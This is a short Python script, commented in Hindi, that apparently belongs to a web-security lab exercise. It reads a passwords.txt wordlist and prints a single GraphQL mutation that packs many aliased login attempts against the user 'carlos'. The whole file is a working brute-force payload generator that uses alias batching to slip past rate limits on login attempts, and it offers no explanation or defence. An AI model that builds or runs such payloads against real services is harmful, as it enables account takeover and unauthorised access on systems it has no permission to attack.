# script.py
# passwords.txt file उसी folder में होनी चाहिए

with open("passwords.txt") as f:
    passwords = [line.strip() for line in f if line.strip()]

print("mutation {")
for index, pw in enumerate(passwords):
    print(f'  brute{index}:login(input:{{username:"carlos", password:"{pw}"}}){{token success}}')
print("}")
